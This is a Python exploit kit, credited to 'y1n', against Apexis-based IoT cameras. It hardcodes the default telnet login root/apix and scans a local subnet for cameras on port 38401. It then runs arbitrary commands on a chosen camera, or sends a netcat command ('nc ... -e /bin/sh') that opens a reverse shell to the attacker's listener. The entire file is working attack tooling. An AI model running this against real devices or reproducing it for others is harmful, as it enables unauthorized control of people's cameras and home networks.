#!/usr/bin/python
# Author: y1n
# Exploit kit for IOT cameras based off Apexis models.
# Writeup of vulnerability discoveries at:
# https://0x57.xyz/2019/02/20/smartwares-c723ip-camera-0-day-vulnerabilities/

import sys
import argparse
import telnetlib
from socket import *
from threading import *

username = 'root'
password = 'apix'

screenLock = Semaphore(value = 1)

def getParser():
    parser = argparse.ArgumentParser(description='Kit Configuration')
    parser.add_argument('-a', '--addr', help='Enter IP address of camera.', default="")
    parser.add_argument('-c', '--connect', action='store_true', help='Connect to a camera on the local network. Use with -a parameter.', default=False)
    parser.add_argument('-s', '--scan', action='store_true', help='Scan the LAN for vulnerable cameras.', default=False)
    parser.add_argument('-l', '--lhost', help='Enter local host IP.')
    parser.add_argument('-p', '--port', help='Enter listner port.', default=443)
    parser.add_argument('-i', '--instruction', help='Enter the command to be executed on the target device. Use with -a parameter.', default="")
    return parser

def instructed():
    global instruction
    global rhost

    print "[*]Connecting to target: " + str(rhost)
    try:
        "[+]Connected!"
        tn = telnetlib.Telnet(rhost)
    except Exception, e:
        print "[-]Failed to connect to target. " + str(e)
        exit(0)
    try:
        tn.read_until("login: ")
        tn.write(username + "\n")
        if password:
            tn.read_until("Password: ")
            tn.write(password + "\n")
    except:
        print "[-]Credentials not accepted. Perhaps changed or not vulnerable"

    print "[*]Sending command:\n" + instruction
    tn.write(instruction + "\n")
    tn.write("exit" + "\n")
    print "[+]Command sent!"
    print tn.read_all()

def connect():
    global lhost
    global lport
    rhost
    print '[*]In a new window, start a netcat listener on port ' + str(lport) + ' with "nc -lnvp ' + str(lport) + '"'
    print '[*]Press y to proceed.'
    letsgo = ''
    while letsgo != "y":
        letsgo = raw_input('>')

    print "[*]Connecting to target: " + str(rhost)
    try:
        "[+]Connected!"
        tn = telnetlib.Telnet(rhost)
    except Exception, e:
        print "[-]Failed to connect to target. " + str(e)
        exit()

    try:
        tn.read_until("login: ")
        tn.write(username + "\n")
        if password:
            tn.read_until("Password: ")
            tn.write(password + "\n")
    except:
        print "[-]Credentials not accepted. Perhaps changed or not vulnerable"

    toSend = ("nc " + lhost + " 443 " + "-e /bin/sh &" + "\n")
    print "[*]Sending command:\n" + toSend
    tn.write(toSend)
    tn.write("exit" + "\n")
    print "[+]Command sent!"
    print "[+]Check your listener!"
    commands = tn.read_all()

def conn_scan(tgtHost,tgtPort):
    tgtHost = "192.168.0." + str(tgtHost)
    try:
        connSkt = socket(AF_INET,SOCK_STREAM)
        connSkt.connect((tgtHost, tgtPort))
        connSkt.send('TestData\r\n')
        results = connSkt.recv(100)
        screenLock.acquire()
        print "[+]Apexis Camera detected: " + tgtHost
        connSkt.close()
    except Exception as e:
        screenLock.acquire()
    finally:
        screenLock.release()
        connSkt.close()

def port_scan():
    setdefaulttimeout(1)
    tgtHosts = range(1,256)
    tgtPort = 38401
    for tgtHost in tgtHosts:
        t = Thread(target = conn_scan, args = (tgtHost, int(tgtPort)))
        t.start()

def motd():
    print '''
                                                                                 iiii
                                                                                i::::i
                                                                                 iiii

      aaaaaaaaaaaaa  ppppp   ppppppppp       eeeeeeeeeeee  xxxxxxx      xxxxxxxiiiiiii     ssssssssss
      a::::::::::::a p::::ppp:::::::::p    ee::::::::::::ee x:::::x    x:::::x i:::::i   ss::::::::::s
      aaaaaaaaa:::::ap:::::::::::::::::p  e::::::eeeee:::::eex:::::x  x:::::x   i::::i ss:::::::::::::s
               a::::app::::::ppppp::::::pe::::::e     e:::::e x:::::xx:::::x    i::::i s::::::ssss:::::s
        aaaaaaa:::::a p:::::p     p:::::pe:::::::eeeee::::::e  x::::::::::x     i::::i  s:::::s  ssssss
      aa::::::::::::a p:::::p     p:::::pe:::::::::::::::::e    x::::::::x      i::::i    s::::::s
     a::::aaaa::::::a p:::::p     p:::::pe::::::eeeeeeeeeee     x::::::::x      i::::i       s::::::s
    a::::a    a:::::a p:::::p    p::::::pe:::::::e             x::::::::::x     i::::i ssssss   s:::::s
    a::::a    a:::::a p:::::ppppp:::::::pe::::::::e           x:::::xx:::::x   i::::::is:::::ssss::::::s
    a:::::aaaa::::::a p::::::::::::::::p  e::::::::eeeeeeee  x:::::x  x:::::x  i::::::is::::::::::::::s
     a::::::::::aa:::ap::::::::::::::pp    ee:::::::::::::e x:::::x    x:::::x i::::::i s:::::::::::ss
      aaaaaaaaaa  aaaap::::::pppppppp        eeeeeeeeeeeeeexxxxxxx      xxxxxxxiiiiiiii  sssssssssss
                      p:::::p
                      p:::::p
                     p:::::::p
                     p:::::::p
                     p:::::::p
                     ppppppppp

                     '''

def main():
    global lhost
    global instruction
    global rhost
    global lport

    motd()
    parser = getParser()
    if len(sys.argv[1:])==0:
        parser.print_help()
        parser.exit()
    args = vars(parser.parse_args())
    lhost = args['lhost']
    lport = args['port']
    rhost = args['addr']
    instruction = args['instruction']

    if (args['addr'] == "" and args['connect'] == True):
        print "[-]Use -a to specify rhost"
        exit(0)

    elif (args['addr'] == "" and args['instruction'] != ""):
        print "[-]Use -a to specify rhost"
        exit(0)

    elif (((args['instruction'] == "") and (args['connect'] == False)) and args['addr'] != ""):
        print "[-]Specify instruction or connect."
        exit(0)

    elif args['scan'] == True:
        print "[+]Scan mode"
        port_scan()
    elif args['connect'] == True:
        print "[+]Connect mode"
        connect()
    elif args['instruction'] != "":
        print "[+]Custom instruction"
        instructed()

if __name__ == "__main__":
    main()
